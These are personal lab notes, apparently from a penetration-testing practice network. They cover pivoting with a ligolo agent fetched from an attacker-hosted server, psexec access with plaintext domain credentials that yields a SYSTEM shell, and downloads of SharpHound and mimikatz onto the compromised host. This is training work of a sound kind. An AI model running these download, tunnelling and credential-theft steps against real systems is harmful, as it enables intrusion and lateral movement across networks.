Had good luck with ligolo in the past lets try again..

```powershell
iwr -uri "http://192.168.45.228:8888/agent.exe" -outfile "C:\Users\Public\Downloads\agent.exe"
```

# ligolo setup

on attack box
```bash
 sudo ip tuntap add user <username> mode tun ligolo

 sudo ip link set ligolo up

 ./poxy -selfcert
```

on victem

``` powershell
.\agent -connect 192.168.45.228:11601 -ignore-cert
```

Forgot to add here, that we need to run ifconfig to check and see if there are other connections to the box. this was done here, and the connection to the 172.16.201.xx network was found. 

on attack box

``` bash 
 sudo ip route add <network_address>/<CIDR> dev ligolo
```

I ran a full scan of all targets last night but was taking a long time. In most cases, I would go thru the data I already had, and look for a box to narrow in on scanning again, As I have experience with this box already, I have gone from my old notes, and saw that I went into the .11 box next. I am avoiding using my old notes to continue on, I want to see what I see with autorecon, and running a narrowed scan on .11

I see that SMB ports are open, reminder to self, autorecon takes its time ill have to look into ways to speed it up if possible, also junks up the pipe so much I dont think I can try other things..

And my thoughts were right, auto reacon really junks the env. I dont know if i would use this in a live env. But for this it is good enough.. 

I am in .11 with

```bash
┌──(zell㉿kali)-[~/…/Medtech/results/192.168.201.121/exploit]
└─$ /usr/local/bin/psexec.py medtech.com/joe:Flowers1@172.16.201.11
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Requesting shares on 172.16.201.11.....
[*] Found writable share ADMIN$
[*] Uploading file lQUmnaEf.exe
[*] Opening SVCManager on 172.16.201.11.....
[*] Creating service OhHA on 172.16.201.11.....
[*] Starting service OhHA.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami /all
 
USER INFORMATION
----------------

User Name           SID     
=================== ========
nt authority\system S-1-5-18


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes                                        
====================================== ================ ============ ==================================================
BUILTIN\Administrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner    
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
Mandatory Label\System Mandatory Level Label            S-1-16-16384                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State   
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled 
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled 
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled 
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled 
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled 
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled 
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled 
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled 
SeAuditPrivilege                          Generate security audits                                           Enabled 
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled 
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled 
SeCreateGlobalPrivilege                   Create global objects                                              Enabled 
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled 
SeTimeZonePrivilege                       Change the time zone                                               Enabled 
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled 
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled 

ERROR: Unable to get user claims information.

C:\Windows\system32>
C:\Windows\system32>
```

Starting as NT/ system, meaning I have the flag, lets look for creds, also, this is a domain machine, time for bloodhound i think


pulling sharphound and mimikatz

``` powershell
iwr -uri "http://192.168.45.228:8888/SharpHound.exe" -outfile "C:\Users\joe\Downloads\sharp.exe"
```

``` powershell
iwr -uri "http://192.168.45.228:8888/mimikatz.exe" -outfile "C:\Users\joe\Downloads\mimikatz.exe"
```

Starting sharphound

``` powershell
.\sharp.exe --CollectionMethods All
```





